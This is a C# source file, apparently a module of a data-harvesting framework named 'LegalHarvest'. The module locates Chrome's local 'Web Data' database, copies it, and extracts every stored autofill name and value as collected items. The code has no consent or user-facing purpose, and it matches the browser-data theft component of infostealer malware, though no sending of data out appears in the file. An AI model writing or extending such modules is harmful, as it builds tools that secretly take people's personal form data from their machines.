using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace LegalHarvest.Modules
{
    public class AutofillDataModule : ICollectorModule
    {
        public string ModuleName => "AutofillData";
        public bool CanExecute()
        {
            string webData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Web Data");
            return File.Exists(webData);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string webData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Web Data");
            string tempDb = Path.GetTempFileName();
            File.Copy(webData, tempDb, true);
            try
            {
                using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                {
                    conn.Open();
                    string query = "SELECT name, value FROM autofill";
                    using (var cmd = new SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                        while (reader.Read())
                            items.Add(new CollectedItem { Category = "Autofill", Name = reader["name"].ToString(), Value = reader["value"].ToString(), Timestamp = DateTime.Now });
                }
            }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
            return items;
        }
    }
}
